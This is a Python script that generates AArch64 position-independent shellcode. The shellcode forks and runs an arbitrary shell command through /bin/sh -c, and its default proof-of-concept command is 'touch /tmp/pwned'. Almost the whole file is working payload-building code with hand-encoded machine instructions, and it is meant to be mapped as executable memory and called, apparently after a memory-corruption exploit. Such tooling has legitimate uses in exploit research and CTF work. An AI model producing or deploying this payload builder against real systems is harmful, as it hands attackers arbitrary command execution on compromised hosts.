#!/usr/bin/env python3
"""
AArch64 position-independent fork+execve shellcode builder.
Returns raw bytes safe to mmap+mprotect(PROT_READ|PROT_EXEC)+call as a C function.

Layout:
  [0]             B past_data        ; skip over embedded data section
  [4]             data:
                    /bin/sh\\0        ; data+0  (8 bytes)
                    -c\\0 padded      ; data+8  (8 bytes)
                    <cmd>\\0 padded   ; data+16 (variable, 4-byte aligned)
  [4+data_size]   past_data:
                    ADR x19, data    ; x19 = &data  (PC-relative, variable offset)
                    MOV x20, x30     ; save C return address in callee-saved x20

                    ; clone(SIGCHLD=17, 0, NULL, NULL, NULL) == fork()
                    MOV x8, #220     ; SYS_clone
                    MOV x0, #17      ; flags=SIGCHLD
                    MOV x1..x4, xzr
                    SVC #0           ; x0=0 (child) or pid (parent)
                    CBNZ x0, parent

                  child:
                    MOV  x0, x19     ; "/bin/sh"
                    ADD  x3, x19, #8 ; "-c"
                    ADD  x4, x19, #16; CMD
                    STP  x4, xzr, [sp,#-16]!  ; argv[2..3]
                    STP  x0, x3,  [sp,#-16]!  ; argv[0..1]
                    MOV  x1, sp      ; argv
                    MOV  x2, xzr     ; envp=NULL
                    MOV  x8, #221    ; SYS_execve
                    SVC  #0
                    MOV  x8, #93     ; SYS_exit(1)
                    MOV  x0, #1
                    SVC  #0

                  parent:
                    MOV  x30, x20    ; restore C return address
                    MOV  x0, xzr     ; return 0
                    RET

AArch64 notes:
- SP must be 16-byte aligned when used as base (SCTLR.SA); use STP (16-byte).
- clone() preserves all regs in child; x19 (callee-saved) holds data ptr.
- All instruction bytes verified with aarch64-linux-gnu-as.
"""
import struct


# Fixed 96-byte code block following past_data.
# First 4 bytes are PLACEHOLDER for the ADR x19, data instruction
# (computed dynamically from data_size in build()).
# Remaining bytes are fixed across all CMD values.
#
# Byte order: little-endian (AArch64 default).
# Offsets from start of this block:
#   +0    ADR x19, data        ← REPLACED in build()
#   +4    mov x20, x30         F4 03 1E AA
#   +8    mov x8, #220         88 1B 80 D2
#   +12   mov x0, #17          20 02 80 D2
#   +16   mov x1, xzr          E1 03 1F AA
#   +20   mov x2, xzr          E2 03 1F AA
#   +24   mov x3, xzr          E3 03 1F AA
#   +28   mov x4, xzr          E4 03 1F AA
#   +32   svc #0               01 00 00 D4
#   +36   cbnz x0, parent      A0 01 00 B5  (+13 instrs = fixed)
#   +40   mov x0, x19          E0 03 13 AA
#   +44   add x3, x19, #8      63 22 00 91
#   +48   add x4, x19, #16     64 42 00 91
#   +52   stp x4, xzr,[sp,#-16]!  E4 7F BF A9
#   +56   stp x0, x3, [sp,#-16]!  E0 0F BF A9
#   +60   mov x1, sp           E1 03 00 91
#   +64   mov x2, xzr          E2 03 1F AA
#   +68   mov x8, #221         A8 1B 80 D2
#   +72   svc #0               01 00 00 D4
#   +76   mov x8, #93          A8 0B 80 D2
#   +80   mov x0, #1           20 00 80 D2
#   +84   svc #0               01 00 00 D4
#   +88   mov x30, x20         FE 03 14 AA
#   +92   mov x0, xzr          E0 03 1F AA
#   +96   ret                  C0 03 5F D6  (total: 25 instructions = 100 bytes)
#
# (Total fixed block after ADR = 24 instructions = 96 bytes)
_FIXED_AFTER_ADR = bytes([
    0xF4, 0x03, 0x1E, 0xAA,  # mov  x20, x30
    0x88, 0x1B, 0x80, 0xD2,  # mov  x8, #220
    0x20, 0x02, 0x80, 0xD2,  # mov  x0, #17
    0xE1, 0x03, 0x1F, 0xAA,  # mov  x1, xzr
    0xE2, 0x03, 0x1F, 0xAA,  # mov  x2, xzr
    0xE3, 0x03, 0x1F, 0xAA,  # mov  x3, xzr
    0xE4, 0x03, 0x1F, 0xAA,  # mov  x4, xzr
    0x01, 0x00, 0x00, 0xD4,  # svc  #0
    0xA0, 0x01, 0x00, 0xB5,  # cbnz x0, parent (+13 instrs)
    0xE0, 0x03, 0x13, 0xAA,  # mov  x0, x19
    0x63, 0x22, 0x00, 0x91,  # add  x3, x19, #8
    0x64, 0x42, 0x00, 0x91,  # add  x4, x19, #16
    0xE4, 0x7F, 0xBF, 0xA9,  # stp  x4, xzr, [sp, #-16]!
    0xE0, 0x0F, 0xBF, 0xA9,  # stp  x0, x3,  [sp, #-16]!
    0xE1, 0x03, 0x00, 0x91,  # mov  x1, sp
    0xE2, 0x03, 0x1F, 0xAA,  # mov  x2, xzr
    0xA8, 0x1B, 0x80, 0xD2,  # mov  x8, #221
    0x01, 0x00, 0x00, 0xD4,  # svc  #0
    0xA8, 0x0B, 0x80, 0xD2,  # mov  x8, #93
    0x20, 0x00, 0x80, 0xD2,  # mov  x0, #1
    0x01, 0x00, 0x00, 0xD4,  # svc  #0
    0xFE, 0x03, 0x14, 0xAA,  # mov  x30, x20
    0xE0, 0x03, 0x1F, 0xAA,  # mov  x0, xzr
    0xC0, 0x03, 0x5F, 0xD6,  # ret
])


def _adr_x19(imm21: int) -> bytes:
    """Encode ADR X19, #imm21 (signed 21-bit byte offset from the ADR instruction)."""
    v    = imm21 & 0x1FFFFF          # 21-bit two's complement
    immlo = v & 3
    immhi = (v >> 2) & 0x7FFFF       # 19 bits
    word = (0 << 31) | (immlo << 29) | (0b10000 << 24) | (immhi << 5) | 19
    return struct.pack('<I', word)


def build(cmd: str) -> bytes:
    shell  = b'/bin/sh\x00'              # 8 bytes
    dash_c = b'-c\x00' + b'\x00' * 5    # 8 bytes (padded to 8)
    cmd_b  = cmd.encode('utf-8') + b'\x00'
    cmd_pad = (len(cmd_b) + 3) & ~3     # pad to 4-byte multiple
    cmd_b_padded = cmd_b + b'\x00' * (cmd_pad - len(cmd_b))

    data = shell + dash_c + cmd_b_padded  # always 4-byte aligned

    data_size = len(data)

    # B past_data: branch forward over the data section.
    # B is at offset 0, past_data at offset (4 + data_size).
    b_imm26 = (4 + data_size) // 4          # instruction units ahead
    b_instr = struct.pack('<I', (0b000101 << 26) | (b_imm26 & 0x3FFFFFF))

    # ADR X19, data: PC-relative address of data section.
    # ADR is at offset (4 + data_size), data at offset 4.
    # imm21 = 4 - (4 + data_size) = -data_size
    adr = _adr_x19(-data_size)

    payload = b_instr + data + adr + _FIXED_AFTER_ADR

    # Pad to multiple of 16
    if len(payload) % 16:
        payload += bytes(16 - len(payload) % 16)
    return payload


if __name__ == '__main__':
    import sys
    cmd = sys.argv[1] if len(sys.argv) > 1 else 'touch /tmp/pwned'
    sys.stdout.buffer.write(build(cmd))
